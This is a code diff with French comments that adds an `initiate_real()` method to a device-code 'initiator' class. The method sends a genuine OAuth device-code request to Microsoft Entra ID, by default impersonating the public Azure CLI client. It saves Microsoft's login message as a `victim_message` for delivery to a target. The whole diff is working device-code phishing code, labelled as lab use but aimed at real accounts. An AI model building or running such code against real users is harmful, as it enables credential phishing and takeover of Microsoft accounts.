@@ -82,10 +82,9 @@ class DeviceCodeInitiator:
         verification_uri: str = "https://microsoft.com/devicelogin",
     ) -> DeviceCodeFlow:
         """
-        Initie un nouveau flow. Retourne un objet `DeviceCodeFlow`.
+        Initie un nouveau flow (mode LABO : codes locaux simulés).
 
-        En labo, on génère des codes locaux. En prod, on appellerait :
-            POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode
+        Pour un flow RÉEL : utiliser `initiate_real()`.
         """
         flow = DeviceCodeFlow(
             flow_id=secrets.token_hex(8),
@@ -100,6 +99,61 @@ class DeviceCodeInitiator:
         logger.warning(
             "[DEVICE_CODE] Flow initié : user_code=%s, expires_in=15min",
             flow.user_code,
+        )
+        return flow
+
+    def initiate_real(
+        self,
+        scope: str = "User.Read",
+        tenant: str = "consumers",
+        client_id: str | None = None,
+    ) -> DeviceCodeFlow:
+        """Initie un flow Device Code RÉEL contre Microsoft Entra ID.
+
+        Appelle réellement :
+            POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode
+
+        Args:
+            scope     : scopes OAuth réels (défaut User.Read, inoffensif)
+            tenant    : consumers | organizations | common | <tenant-id>
+            client_id : client_id d'app Azure (défaut: Azure CLI well-known,
+                        uniquement pour tests de labo)
+
+        Raises:
+            RuntimeError : si l'API Microsoft est injoignable ou refuse.
+        """
+        import httpx
+
+        cid = client_id or self.client_id
+        if cid == "00000000-0000-0000-0000-000000000000":
+            cid = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Azure CLI public (labo)
+
+        url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode"
+        resp = httpx.post(url, data={"client_id": cid, "scope": scope}, timeout=15)
+        if resp.status_code != 200:
+            raise RuntimeError(
+                f"Device code initiation échouée: HTTP {resp.status_code} — {resp.text[:200]}"
+            )
+        d = resp.json()
+
+        flow = DeviceCodeFlow(
+            flow_id=secrets.token_hex(8),
+            client_id=cid,
+            scope=scope,
+            device_code=d["device_code"],
+            user_code=d["user_code"],
+            verification_uri=d.get("verification_url")
+            or d.get("verification_uri", "https://microsoft.com/link"),
+            expires_at=(
+                datetime.utcnow() + timedelta(seconds=int(d.get("expires_in", 900)))
+            ).isoformat() + "Z",
+            interval=int(d.get("interval", 5)),
+        )
+        # Message officiel Microsoft à transmettre à la "victime"
+        flow.victim_message = d.get("message", "")
+        logger.warning(
+            "[DEVICE_CODE][REAL] flow initié contre %s : user_code=%s (expire %ss)",
+            tenant, flow.user_code, d.get("expires_in"),
         )
         return flow
 
